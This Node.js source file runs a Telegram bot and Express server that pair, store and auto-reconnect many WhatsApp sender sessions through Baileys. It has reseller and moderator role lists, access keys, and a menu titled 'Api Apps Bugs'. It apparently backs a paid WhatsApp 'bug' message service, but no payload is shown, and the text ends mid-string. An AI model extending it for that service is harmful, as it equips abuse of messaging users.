const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const http = require('http');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const readline = require('readline');
const actions = require('./function-config');
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userFilePath = path.join(__dirname, 'database', 'user.json');
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;

function getCountryFromNumber(phoneNumber) {
    const cleaned = ('' + phoneNumber).replace(/\D/g, '');

    const countryCodes = {
        // Asia & Southeast Asia
        '62': { code: 'ID', name: 'Indonesia', emoji: '🇮🇩' },
        '60': { code: 'MY', name: 'Malaysia', emoji: '🇲🇾' },
        '65': { code: 'SG', name: 'Singapore', emoji: '🇸🇬' },
        '66': { code: 'TH', name: 'Thailand', emoji: '🇹🇭' },
        '84': { code: 'VN', name: 'Vietnam', emoji: '🇻🇳' },
        '63': { code: 'PH', name: 'Philippines', emoji: '🇵🇭' },
        '855': { code: 'KH', name: 'Cambodia', emoji: '🇰🇭' },
        '856': { code: 'LA', name: 'Laos', emoji: '🇱🇦' },
        '95': { code: 'MM', name: 'Myanmar', emoji: '🇲🇲' },
        '670': { code: 'TL', name: 'Timor-Leste', emoji: '🇹🇱' },
        '81': { code: 'JP', name: 'Japan', emoji: '🇯🇵' },
        '82': { code: 'KR', name: 'South Korea', emoji: '🇰🇷' },
        '86': { code: 'CN', name: 'China', emoji: '🇨🇳' },
        '886': { code: 'TW', name: 'Taiwan', emoji: '🇹🇼' },
        '852': { code: 'HK', name: 'Hong Kong', emoji: '🇭🇰' },
        '91': { code: 'IN', name: 'India', emoji: '🇮🇳' },
        '92': { code: 'PK', name: 'Pakistan', emoji: '🇵🇰' },
        '880': { code: 'BD', name: 'Bangladesh', emoji: '🇧🇩' },
        '94': { code: 'LK', name: 'Sri Lanka', emoji: '🇱🇰' },
        '977': { code: 'NP', name: 'Nepal', emoji: '🇳🇵' },

        // Middle East
        '966': { code: 'SA', name: 'Saudi Arabia', emoji: '🇸🇦' },
        '971': { code: 'AE', name: 'United Arab Emirates', emoji: '🇦🇪' },
        '90': { code: 'TR', name: 'Turkey', emoji: '🇹🇷' },
        '98': { code: 'IR', name: 'Iran', emoji: '🇮🇷' },
        '964': { code: 'IQ', name: 'Iraq', emoji: '🇮🇶' },
        '972': { code: 'IL', name: 'Israel', emoji: '🇮🇱' },
        '965': { code: 'KW', name: 'Kuwait', emoji: '🇰🇼' },
        '974': { code: 'QA', name: 'Qatar', emoji: '🇶🇦' },
        '968': { code: 'OM', name: 'Oman', emoji: '🇴🇲' },
        '962': { code: 'JO', name: 'Jordan', emoji: '🇯🇴' },
        '961': { code: 'LB', name: 'Lebanon', emoji: '🇱🇧' },

        // Europe
        '44': { code: 'GB', name: 'United Kingdom', emoji: '🇬🇧' },
        '49': { code: 'DE', name: 'Germany', emoji: '🇩🇪' },
        '33': { code: 'FR', name: 'France', emoji: '🇫🇷' },
        '39': { code: 'IT', name: 'Italy', emoji: '🇮🇹' },
        '34': { code: 'ES', name: 'Spain', emoji: '🇪🇸' },
        '31': { code: 'NL', name: 'Netherlands', emoji: '🇳🇱' },
        '32': { code: 'BE', name: 'Belgium', emoji: '🇧🇪' },
        '41': { code: 'CH', name: 'Switzerland', emoji: '🇨🇭' },
        '43': { code: 'AT', name: 'Austria', emoji: '🇦🇹' },
        '46': { code: 'SE', name: 'Sweden', emoji: '🇸🇪' },
        '47': { code: 'NO', name: 'Norway', emoji: '🇳🇴' },
        '45': { code: 'DK', name: 'Denmark', emoji: '🇩🇰' },
        '358': { code: 'FI', name: 'Finland', emoji: '🇫🇮' },
        '7': { code: 'RU', name: 'Russia', emoji: '🇷🇺' },
        '380': { code: 'UA', name: 'Ukraine', emoji: '🇺🇦' },
        '48': { code: 'PL', name: 'Poland', emoji: '🇵🇱' },
        '351': { code: 'PT', name: 'Portugal', emoji: '🇵🇹' },
        '30': { code: 'GR', name: 'Greece', emoji: '🇬🇷' },
        '353': { code: 'IE', name: 'Ireland', emoji: '🇮🇪' },
        '420': { code: 'CZ', name: 'Czech Republic', emoji: '🇨🇿' },
        '36': { code: 'HU', name: 'Hungary', emoji: '🇭🇺' },
        '40': { code: 'RO', name: 'Romania', emoji: '🇷🇴' },

        // Americas
        '1': { code: 'US', name: 'USA/Canada', emoji: '🇺🇸' },
        '52': { code: 'MX', name: 'Mexico', emoji: '🇲🇽' },
        '55': { code: 'BR', name: 'Brazil', emoji: '🇧🇷' },
        '54': { code: 'AR', name: 'Argentina', emoji: '🇦🇷' },
        '57': { code: 'CO', name: 'Colombia', emoji: '🇨🇴' },
        '56': { code: 'CL', name: 'Chile', emoji: '🇨🇱' },
        '51': { code: 'PE', name: 'Peru', emoji: '🇵🇪' },
        '58': { code: 'VE', name: 'Venezuela', emoji: '🇻🇪' },
        '502': { code: 'GT', name: 'Guatemala', emoji: '🇬🇹' },
        '53': { code: 'CU', name: 'Cuba', emoji: '🇨🇺' },

        // Oceania
        '61': { code: 'AU', name: 'Australia', emoji: '🇦🇺' },
        '64': { code: 'NZ', name: 'New Zealand', emoji: '🇳🇿' },
        '679': { code: 'FJ', name: 'Fiji', emoji: '🇫🇯' },
        '675': { code: 'PG', name: 'Papua New Guinea', emoji: '🇵🇬' },

        // Africa
        '27': { code: 'ZA', name: 'South Africa', emoji: '🇿🇦' },
        '20': { code: 'EG', name: 'Egypt', emoji: '🇪🇬' },
        '234': { code: 'NG', name: 'Nigeria', emoji: '🇳🇬' },
        '254': { code: 'KE', name: 'Kenya', emoji: '🇰🇪' },
        '212': { code: 'MA', name: 'Morocco', emoji: '🇲🇦' },
        '213': { code: 'DZ', name: 'Algeria', emoji: '🇩🇿' },
        '251': { code: 'ET', name: 'Ethiopia', emoji: '🇪🇹' },
        '233': { code: 'GH', name: 'Ghana', emoji: '🇬🇭' },
        '216': { code: 'TN', name: 'Tunisia', emoji: '🇹🇳' },
        '255': { code: 'TZ', name: 'Tanzania', emoji: '🇹🇿' },
        '256': { code: 'UG', name: 'Uganda', emoji: '🇺🇬' },
        '260': { code: 'ZM', name: 'Zambia', emoji: '🇿🇲' },
        '263': { code: 'ZW', name: 'Zimbabwe', emoji: '🇿🇼' }
        
        // ... (Catatan: Daftar di atas mencakup negara-negara utama, secara total list ini menangani sebagian besar trafik nomor internasional)
    };

    // Logika sorting agar kode 3 digit didahulukan sebelum 1 digit
    const sortedCodes = Object.keys(countryCodes).sort((a, b) => b.length - a.length);

    for (const code of sortedCodes) {
        if (cleaned.startsWith(code)) {
            return countryCodes[code];
        }
    }

    return { code: 'XX', name: 'Unknown/International', emoji: '🌐' };
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    // Pastikan direktori database ada
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    // Pastikan setiap user punya role default 'user' jika tidak ada
    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    // Tulis file dengan format yang rapi
    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅  Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true; // ✅ Kembalikan true jika sukses
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false; // ✅ Kembalikan false jika gagal
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  
  // Jika file tidak ada, buat file kosong
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }
  
  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    
    // Handle file kosong
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }
    
    const users = JSON.parse(fileContent);
    
    // Pastikan setiap user punya role
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);
    
    // Jika file corrupt, buat backup dan reset
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }
    
    // Reset file dengan array kosong
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");
    
    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

function isValidPhoneNumber(number) {
    // Menghapus karakter non-digit
    const cleaned = ('' + number).replace(/\D/g, '');
    // Validasi sederhana: pastikan panjangnya antara 10-15 digit
    return cleaned.length >= 7 && cleaned.length <= 15;
}

// Fungsi menulis ulang file config
// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
      reloadAttempts = 0; 
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;
  let staffSessions = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing: ${username} with ${numbers.length} senders`);
    
    const isStaffSession = username.startsWith('staff_');
    
    numbers.forEach(number => {
      totalProcessed++;
      if (isStaffSession) staffSessions++;
      
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        if (isStaffSession) {
          reconnectStaffBackground(username, number, sessionDir)
            .then(() => {
              successCount++;
              console.log(`✅ Staff reconnected: ${number}`);
            })
            .catch(err => {
              console.log(`❌ Failed to reconnect staff ${number}: ${err.message}`);
            });
        } else {
          connectToWhatsAppUser(username, number, sessionDir)
            .then(() => {
              successCount++;
              console.log(`✅ User reconnected: ${number}`);
            })
            .catch(err => {
              console.log(`❌ Failed to reconnect user ${number}: ${err.message}`);
            });
        }
      } else {
        console.log(`⚠️ No session files for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions`);
  console.log(`👔 Staff sessions: ${staffSessions}`);
}

// ==================== AUTO RECONNECT USER SESSIONS ==================== //
function autoReconnectUserSessions() {
  console.log('🔄 AUTO RECONNECT: Checking user sessions...');
  const userSessions = loadUserSessions();
  
  let totalAttempts = 0;
  let successCount = 0;
  
  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Auto-reconnecting user: ${username} (${numbers.length} senders)`);
    
    numbers.forEach(number => {
      totalAttempts++;
      
      if (sessions.has(number)) {
        console.log(`✅ ${number} already connected, skipping`);
        return;
      }
      
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (!fs.existsSync(credsPath)) {
        console.log(`⚠️ No session found for ${number}, user needs to pair again`);
        return;
      }
      
      console.log(`🔄 Auto-reconnecting ${number} for ${username}`);
      
      connectToWhatsAppUser(username, number, sessionDir)
        .then(sock => {
          successCount++;
          console.log(`✅ Auto-reconnect SUCCESS: ${number} for ${username}`);
          
          sendEventToUser(username, {
            type: 'success',
            message: `Sender ${number} berhasil di-reconnect otomatis`,
            number: number,
            status: 'reconnected'
          });
        })
        .catch(err => {
          console.log(`❌ Auto-reconnect FAILED for ${number}: ${err.message}`);
          
          sendEventToUser(username, {
            type: 'warning',
            message: `Sender ${number} gagal reconnect: ${err.message}`,
            number: number,
            status: 'disconnected'
          });
        });
    });
  }
  
  console.log(`📊 Auto-reconnect summary: ${successCount}/${totalAttempts} sessions`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(BotNumber, userSock);
          
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          const userSessions = loadUserSessions();
          if (!userSessions[username]) {
            userSessions[username] = [];
          }
          if (!userSessions[username].includes(BotNumber)) {
            userSessions[username].push(BotNumber);
            saveUserSessions(userSessions);
            console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
          }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

// ==================== CONNECT FOR STAFF (TELEGRAM) ==================== //
const connectToWhatsAppStaff = async (ctx, number) => {
  try {
    console.log(`[STAFF] 🚀 Starting WhatsApp connection for ${number}`);
    
    const username = `staff_${ctx.from.id}`;
    const sessionDir = userSessionPath(username, number);
    
    await ctx.reply(`🔄 *Connecting ${number} as staff sender...*`, { parse_mode: "Markdown" });
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const staffSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      staffSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[STAFF] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[STAFF] ❌ Connection closed with status:`, statusCode);

          sessions.delete(number);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[STAFF] 📵 Device logged out, cleaning session...`);
            await ctx.reply(`❌ Device logged out, please pair again: ${number}`);
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[STAFF] 🔄 Reconnecting...`);
            await ctx.reply(`⚠️ Reconnecting ${number}...`);
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppStaff(ctx, number);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            await ctx.reply(`❌ Connection failed for ${number}: Status ${statusCode}`);
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[STAFF] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(number, staffSock);
          
          const userSessions = loadUserSessions();
          if (!userSessions[username]) {
            userSessions[username] = [];
          }
          if (!userSessions[username].includes(number)) {
            userSessions[username].push(number);
            saveUserSessions(userSessions);
            console.log(`[STAFF] 💾 Session saved for ${number}`);
          }
          
          await ctx.reply(`✅ *SUCCESS!* Sender ${number} connected as staff.`, { parse_mode: "Markdown" });
          resolve(staffSock);
        }

        if (connection === "connecting") {
          await ctx.reply(`🔄 Connecting to WhatsApp for ${number}...`);
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[STAFF] 📞 Requesting pairing code for ${number}...`);
                await ctx.reply(`📱 *Requesting pairing code...*`, { parse_mode: "Markdown" });
                
                const code = await staffSock.requestPairingCode(number);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                const message = `
🔐 *PAIRING CODE - STAFF*

📱 *Sender:* ${number}
🔢 *Code:* \`${formattedCode}\`

*Instructions:*
1. Open WhatsApp on your phone
2. Tap ⋮ (three dots) > Linked Devices > Link a Device  
3. Enter this pairing code:
   \`\`\`
   ${formattedCode}
   \`\`\`
4. Code valid for 30 seconds!

_This code will also be saved for auto-reconnect._
                `;
                
                await ctx.reply(message, { parse_mode: "Markdown" });
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 STAFF PAIRING CODE            ║`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Sender : ${number}               ║`);
                console.log(`║  Code   : ${formattedCode}        ║`);
                console.log(`╚═══════════════════════════════════╝`);
                
              } catch (err) {
                console.error(`[STAFF] ❌ Error requesting pairing code:`, err.message);
                await ctx.reply(`❌ Error getting pairing code: ${err.message}`);
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[STAFF] 📋 QR Code received`);
          await ctx.reply(`📱 *QR Code Received*\nPlease use pairing code instead.`, { parse_mode: "Markdown" });
        }
      });

      staffSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          ctx.reply(`⏰ *Timeout* - Could not complete connection in 120 seconds`, { parse_mode: "Markdown" });
          cleanup();
          reject(new Error("Connection timeout"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[STAFF] ❌ Error in connectToWhatsAppStaff:`, error);
    await ctx.reply(`❌ Connection error: ${error.message}`);
    throw error;
  }
};

// ==================== AUTO-RECONNECT FOR STAFF (BACKGROUND) ==================== //
async function reconnectStaffBackground(staffUsername, number, sessionDir) {
  try {
    console.log(`[STAFF-AUTO] 🔄 Reconnecting staff sender: ${number}`);
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const staffSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let connectionTimeout;

      staffSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[STAFF-AUTO] ❌ ${number} disconnected:`, statusCode);

          sessions.delete(number);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[STAFF-AUTO] 📵 ${number} logged out`);
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            reject(new Error("Device logged out"));
            return;
          }

          setTimeout(async () => {
            try {
              await reconnectStaffBackground(staffUsername, number, sessionDir);
              resolve();
            } catch (error) {
              reject(error);
            }
          }, 10000);
        }

        if (connection === "open") {
          console.log(`[STAFF-AUTO] ✅ ${number} reconnected!`);
          isConnected = true;
          
          sessions.set(number, staffSock);
          resolve();
        }
      });

      staffSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          reject(new Error("Staff reconnect timeout"));
        }
      }, 60000);
    });
  } catch (error) {
    console.error(`[STAFF-AUTO] ❌ Error:`, error.message);
    throw error;
  }
}

// Pastikan variabel ini ada di bagian paling atas script kamu
bot.command("start", async (ctx) => {
  // Fungsi untuk membersihkan karakter HTML agar tidak error
  const escapeHTML = (str) => 
    str.replace(/[&<>]/g, (tag) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;'
    }[tag] || tag));

  const rawUsername = ctx.from.username || ctx.from.first_name || "Unknown";
  const username = escapeHTML(rawUsername);

  const teks = `<blockquote>Api Apps Bugs 💭</blockquote>
<i>Update with high level update</i>
<i>Super large database security</i>

